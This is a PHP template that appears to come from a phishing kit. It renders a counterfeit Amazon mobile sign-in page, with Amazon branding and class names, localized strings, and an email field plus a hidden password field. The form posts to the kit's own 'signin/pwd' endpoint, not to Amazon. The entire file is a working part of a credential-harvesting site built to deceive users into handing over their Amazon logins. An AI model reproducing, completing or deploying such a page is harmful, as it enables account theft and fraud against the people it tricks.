<?php
defined("ALLOW") or exit('No direct script access allowed');

$country = trim($_SESSION['countryCode']);
include FCPATH . "language/lang.php";
?>
<!DOCTYPE html>
<html class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember awa-browser" data-19ax5a9jf="mongoose" data-aui-build-date="3.21.4-2021-08-16">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
    <title>
        <?php echo $_1 ?>
    </title>
    <link rel="shortcut icon" href="<?= base_url() ?>Assets/fvck/images/favicon.ico" />
    <link rel="stylesheet" href="<?= base_url() ?>Assets/fvck/css/sign-mobile.css">
    <link rel="stylesheet" href="<?= base_url() ?>Assets/fvck/css/style.sign-mobile.css">
    <link rel="stylesheet" href="<?= base_url() ?>Assets/fvck/css/style2.sign-mobile.css">
</head>
<body class="a-color-offset-background ap-locale-en_US a-m-us a-aui_72554-c a-aui_button_aria_label_markup_348458-t1 a-aui_csa_templates_buildin_ww_exp_337518-t1 a-aui_csa_templates_buildin_ww_launch_337517-c a-aui_csa_templates_declarative_ww_exp_337521-c a-aui_csa_templates_declarative_ww_launch_337520-c a-aui_dynamic_img_a11y_markup_345061-t1 a-aui_mm_desktop_exp_291916-c a-aui_mm_desktop_launch_291918-c a-aui_mm_desktop_targeted_exp_291928-c a-aui_mm_desktop_targeted_launch_291922-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c auth-show-password-enabled auth-show-password-ready" cz-shortcut-listen="true">
    <div id="a-page">
        <div class="a-section a-spacing-none">
            <header id="nav-main" data-nav-language="en_US" class="nav-mobile nav-progressive-attribute nav-locale-us nav-lang-en nav-ssl nav-unrec nav-blueheaven">
                <div id="navbar" cel_widget_id="Navigation-mobile-navbar" role="navigation" class="nav-t-basicNoAuth nav-sprite-v3 celwidget" data-csa-c-id="ccfmjt-p4zuo0-ncg407-rmk4dj">
                    <div id="nav-logobar">
                        <div class="nav-left">
                            <div id="nav-logo">
                                <a href="#" id="nav-logo-sprites" class="nav-logo-link nav-progressive-attribute" aria-label="Amazon"> <span class="nav-sprite nav-logo-base"></span>
                                <span id="logo-ext" class="nav-sprite nav-logo-ext nav-progressive-content"></span>
                                <span class="nav-logo-locale">.us</span> </a>
                            </div>
                        </div>
                        <div class="nav-right"> </div>
                    </div>
                </div>
                <div id="nav-progressive-subnav"> </div>
            </header>
        </div>
        <div class="a-container">
            <div class="a-section a-spacing-none auth-pagelet-mobile-container badInput hide">
                <div id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base" aria-live="assertive" role="alert">
                    <div class="a-box-inner a-alert-container">
                        <h4 class="a-alert-heading"><?php echo $_2 ?> </h4>
                        <div class="a-alert-content">
                            <ul class="a-unordered-list a-nostyle a-vertical" role="alert">
                                <li>
                                  <span class="a-list-item"> <?php echo $_3 ?> </span> </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
            <form name="signin" id="fms-form" action="<?= base_url() ?>signin/pwd" method="post" no-validate>
                <div class="a-section auth-pagelet-mobile-container emailpage">
                    <div id="outer-accordion-signin-signup-page" class="a-section">
                        <h2> <?php echo $_25 ?> </h2>
                        <div id="accordion-signin-signup-page" data-a-accordion-name="accordion-signin-signup-page" class="a-box-group a-accordion a-spacing-medium a-spacing-top-mini" role="radioGroup">
                            <div id="accordion-row-register" class="a-box">
                                <div class="a-box-inner a-accordion-row-container">
                                    <div class="a-accordion-row-a11y" role="radio">
                                        <a id="register_accordion_header" data-action="a-accordion" class="a-accordion-row a-declarative">
                                            <i class="a-icon a-accordion-radio a-icon-radio-inactive"></i>
                                            <h5>
                                                <div class="a-row"> <span class="a-size-base a-text-bold">
                                                  <?php echo $_26 ?></span>. 
                                                  <span class="a-size-small accordionHeaderMessage"><?php echo $_19 ?></span> </div>
                                            </h5>
                                        </a>
                                    </div>
                                </div>
                            </div>
                            <div id="accordion-row-login" class="a-box a-accordion-active" data-a-accordion-row-name="accordion-row-login">
                                <div class="a-box-inner a-accordion-row-container">
                                    <div class="a-accordion-row-a11y" role="radio" aria-checked="true" aria-expanded="true">
                                        <a id="login_accordion_header" data-action="a-accordion" class="a-accordion-row a-declarative" href="#" aria-label="">
                                            <i class="a-icon a-accordion-radio a-icon-radio-active"></i>
                                            <h5>
                                                <div class="a-row"> <span class="a-size-base a-text-bold"><?php echo $_4 ?></span>. <span class="a-size-small accordionHeaderMessage"><?php echo $_27 ?></span> </div>
                                            </h5>
                                        </a>
                                    </div>
                                    <div class="a-accordion-inner">
                                        <div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
                                            <label for="ap_email_login" aria-hidden="true" class="a-form-label"><?php echo $_5 ?></label>
                                            <div class="a-row a-spacing-base"> <span class="a-declarative">
                                                    <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container emailfocus"> 
                                                    <input type="text" maxlength="128" id="emailLogin" name="emailLogin" autocorrect="off" autocapitalize="off" required="">
                                                        <style>
                                                            .show {
                                                                display: block;
                                                            }
                                                        </style>
                                                        <div id="ap_email_login_icon" class="auth-clear-icons"> 
                                                        <i class="a-icon a-icon-close" role="img" aria-label="Clear email text field, button"></i> </div>
                                                    </div>
                                                </span> </div>
                                            <div class="a-input-text-wrapper hide">
                                                <input type="password" id="passwordLogin" maxlength="1024" id="ap-credential-autofill-hint" name="passwordLogin" class="">
                                            </div>
                                            <div id="auth-emailLogin-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini emailnull" aria-live="assertive" role="alert">
                                                <div class="a-box-inner a-alert-container"> <i class="a-icon a-icon-alert"></i>
                                                    <div class="a-alert-content">
                                                        <?php echo $_6 ?>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="a-row"> </div>
                                        <div class="a-section">
                                            <div class=""> 
                                                <span id="continue" class="">
                                                    <span id="signInSubmit" class="a-button" style="border-radius:10px; background-color: #ffd814; border: none;">
                                                        <input style="background-color:#ffd814; color:black; border-radius: 10px;" id="signInSubmit" name="signInSubmit" class="a-button-input" type="submit" onclick="return showPass();">
                                                        <span id="signInSubmit" class="a-button-text" aria-hidden="true"> 
                                                          <?php echo $_7 ?> </span>
                                                        </span>
                                                </span>
                                                <div class="a-section a-spacing-medium">
                                                    <div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
                                                       <?php echo $_8 ?>
                                                        <a href="#">
                                                           <?php echo $_9 ?>
                                                        </a> <?php echo $_10 ?>
                                                        <a href="#">
                                                           <?php echo $_11 ?>
                                                        </a>.
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="a-section">
                                            <div aria-live="polite" class="a-row a-expander-container a-expander-inline-container"> 
                                            <a href="#" class="a-expander-header a-declarative a-expander-inline-header a-link-expander"><i class="a-icon a-icon-expand"></i>
                                            <span class="a-expander-prompt"> <?php echo $_12 ?> </span></a> </div>
                                        </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </form>
            <footer class="nav-mobile nav-ftr-batmobile">
                <div id="nav-ftr" class="nav-t-footer-basicNoAuth nav-sprite-v3">
                    <ul class="nav-ftr-horiz">
                        <li class="nav-li">
                            <a href="#" class="nav-a">
                                <?php echo $_21 ?>
                            </a>
                        </li>
                        <li class="nav-li">
                            <a href="#" class="nav-a">
                                <?php echo $_22 ?>
                            </a>
                        </li>
                        <li class="nav-li">
                            <a href="#" class="nav-a">
                                <?php echo $_32 ?>
                            </a>
                        </li>
                    </ul>
                    <div id="nav-ftr-copyright">
                        <?php echo $_24 ?>
                    </div>
                </div>
            </footer>
        </div>
    <script src="<?= base_url() ?> Views/panel/assets/js/jquery-3.3.1.min.js"></script>
    <script src="<?= base_url() ?> Views/panel/assets/js/jquery.validate.min.js"></script>
</body>
</html>